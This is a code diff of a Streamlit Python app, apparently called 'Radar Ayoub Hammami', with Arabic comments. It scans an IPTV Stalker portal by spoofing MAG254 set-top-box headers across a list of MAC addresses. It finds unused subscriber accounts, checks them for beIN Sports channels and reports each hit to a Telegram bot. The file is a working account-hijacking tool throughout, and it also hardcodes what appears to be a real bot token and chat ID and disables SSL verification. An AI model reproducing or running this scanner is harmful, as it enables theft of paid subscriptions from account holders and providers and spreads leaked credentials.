@@ -2,34 +2,39 @@ import streamlit as st
 import requests
 import time
 import telebot
-import random
 import re
+import urllib3
 
-# --- بياناتك ---
+# تعطيل تحذيرات SSL المزعجة
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# --- بياناتك الثابتة ---
 TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
 ID = 7638628794
 bot = telebot.TeleBot(TOKEN)
 
+# الكلمات المفتاحية
 CHANNELS_KEYS = {
     "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
     "IARI BEIN SPORTS 8K": ["8K", "IARI"],
     "IARI BEIN SPORTS 4K": ["4K", "IARI"]
 }
 
-# --- إعداد الواجهة ---
+# إعداد الواجهة
 st.set_page_config(page_title="Radar Ayoub Hammami", page_icon="📡")
 st.markdown("<h1 style='text-align: center; color: #FF4B4B;'>📡 Radar Ayoub Hammami Pro</h1>", unsafe_allow_html=True)
 
-raw_data = st.text_area("انسخ هنا النص العشوائي (روابط وماكات مبعثرة)", height=150)
+raw_data = st.text_area("ضع الرابط والماكات هنا:", height=150, placeholder="http://example.com/c/\n00:1A:79:...")
 
-def check_server_health(url):
-    """تحقق من استجابة السيرفر مع تجاوز أخطاء SSL"""
-    try:
-        # نحاول الاتصال بالسيرفر مع مهلة 10 ثواني
-        response = requests.get(url, timeout=10, verify=False, headers={'User-Agent': 'MAG254'})
-        return True, response.status_code
-    except Exception as e:
-        return False, str(e)
+def get_headers(mac):
+    return {
+        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+        'Cookie': f'mac={mac}',
+        'X-User-Agent': 'Model: MAG254; Link: WiFi',
+        'Referer': 'http://mag.infomir.com/',
+        'Accept': '*/*',
+        'Connection': 'keep-alive'
+    }
 
 if st.button("🚀 بدء المسح الشامل"):
     if raw_data:
@@ -37,69 +42,65 @@ if st.button("🚀 بدء المسح الشامل"):
         host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', raw_data)
         
         if host_match and macs:
-            full_url = host_match.group(0).split('/portal.php')[0].strip('/')
-            # التأكد من إضافة /portal.php للفحص
-            target_url = f"{full_url}/portal.php"
-            
-            st.info(f"🔍 يتم الآن فحص استجابة: {target_url}")
-            is_alive, status_info = check_server_health(target_url)
-            
-            # ملاحظة: حتى لو أعطى 404 أو 403، قد يكون السيرفر شغالاً ويقبل الـ MAC
-            if is_alive or "40" in str(status_info):
-                st.success(f"🟢 السيرفر يستجيب (Status: {status_info})")
-                
-                found_count = 0
-                checked_count = 0
-                stat_checked = st.empty()
-                stat_found = st.empty()
-                placeholder = st.empty()
-                
-                for current_mac in macs:
-                    checked_count += 1
-                    stat_checked.metric("إجمالي الفحوصات", checked_count)
-                    placeholder.info(f"🔎 يفحص الآن: {current_mac}")
-                    
-                    headers = {
-                        'User-Agent': 'MAG254',
-                        'Cookie': f'mac={current_mac}',
-                        'X-User-Agent': 'Model: MAG254; Link: WiFi'
-                    }
-                    
-                    try:
-                        # محاولة جلب البروفايل
-                        url_prof = f"{target_url}?type=stb&action=get_profile&force_stb=1"
-                        r_prof = requests.get(url_prof, headers=headers, timeout=7, verify=False)
-                        
-                        if r_prof.status_code == 200:
-                            match = re.search(r'"active_cons"\s*:\s*"(\d+)"', r_prof.text)
-                            active = match.group(1) if match else "0"
-
-                            if active == "0":
-                                found_count += 1
-                                stat_found.metric("الصيد الذهبي", found_count)
-                                
-                                # جلب القنوات
-                                url_ch = f"{target_url}?type=itv&action=get_all_channels"
-                                r_ch = requests.get(url_ch, headers=headers, timeout=7, verify=False)
-                                ch_text = r_ch.text.upper()
-                                found_channels = [f"✅ {n}" for n, k in CHANNELS_KEYS.items() if all(x in ch_text for x in k)]
-                                
-                                alert = (
-                                    f"🎯 **صيد متاح بواسطة Radar Ayoub**\n\n"
-                                    f"🌐 السيرفر: `{full_url}`\n"
-                                    f"🖥️ الماك: `{current_mac}`\n"
-                                    f"👥 المتصلون: `0`\n"
-                                    f"📺 القنوات:\n" + ("\n".join(found_channels) if found_channels else "❌ لم يتم العثور على قنواتك المحددة") +
-                                    f"\n\n👤 المالك: Ayoub Hammami"
-                                )
-                                bot.send_message(ID, alert, parse_mode="Markdown")
-                                st.toast(f"✅ تم الصيد: {current_mac}")
-                    except:
-                        continue
-                    time.sleep(1)
+            # تنظيف الرابط
+            base_url = host_match.group(0).split('/portal.php')[0].rstrip('/')
+            if not base_url.endswith('/portal.php'):
+                api_url = f"{base_url}/portal.php"
             else:
-                st.error(f"🔴 السيرفر لا يستجيب. الخطأ: {status_info}")
+                api_url = base_url
+
+            st.success(f"📡 السيرفر المستهدف: {api_url}")
+            
+            # لوحة النتائج
+            checked_count = 0
+            found_count = 0
+            c1, c2 = st.columns(2)
+            stat_checked = c1.metric("تم فحص", "0")
+            stat_found = c2.metric("الصيد الذهبي", "0")
+            progress_bar = st.progress(0)
+            log_area = st.empty()
+
+            for i, current_mac in enumerate(macs):
+                checked_count += 1
+                headers = get_headers(current_mac)
+                
+                try:
+                    # محاولة جلب البروفايل مباشرة
+                    profile_url = f"{api_url}?type=stb&action=get_profile&force_stb=1"
+                    r = requests.get(profile_url, headers=headers, timeout=10, verify=False)
+                    
+                    if r.status_code == 200 and '"active_cons"' in r.text:
+                        active = re.search(r'"active_cons"\s*:\s*"(\d+)"', r.text)
+                        is_active = active.group(1) if active else "1"
+
+                        if is_active == "0":
+                            found_count += 1
+                            # فحص القنوات
+                            ch_url = f"{api_url}?type=itv&action=get_all_channels"
+                            r_ch = requests.get(ch_url, headers=headers, timeout=10, verify=False)
+                            ch_text = r_ch.text.upper()
+                            
+                            found_channels = [n for n, k in CHANNELS_KEYS.items() if all(x in ch_text for x in k)]
+                            
+                            # إرسال تلغرام
+                            msg = (f"🎯 **صيد جديد - Ayoub**\n\n🖥️ الماك: `{current_mac}`\n🌐 السيرفر: `{base_url}`\n"
+                                   f"📺 القنوات: {', '.join(found_channels) if found_channels else 'غير محددة'}")
+                            bot.send_message(ID, msg, parse_mode="Markdown")
+                            st.toast(f"✅ تم صيد: {current_mac}")
+                    
+                    elif r.status_code == 401:
+                        log_area.warning(f"⚠️ الماك محمي أو مرفوض: {current_mac}")
+                except Exception as e:
+                    log_area.error(f"❌ خطأ في الاتصال: {current_mac}")
+
+                # تحديث الواجهة
+                stat_checked.metric("تم فحص", checked_count)
+                stat_found.metric("الصيد الذهبي", found_count)
+                progress_bar.progress((i + 1) / len(macs))
+                time.sleep(0.5) # سرعة معقولة لتجنب الحظر
+
+            st.balloons()
         else:
-            st.error("❌ تأكد من وجود رابط وماكات صحيحة.")
+            st.error("❌ الرابط أو الماكات غير صحيحة.")
     else:
         st.warning("⚠️ الصندوق فارغ!")
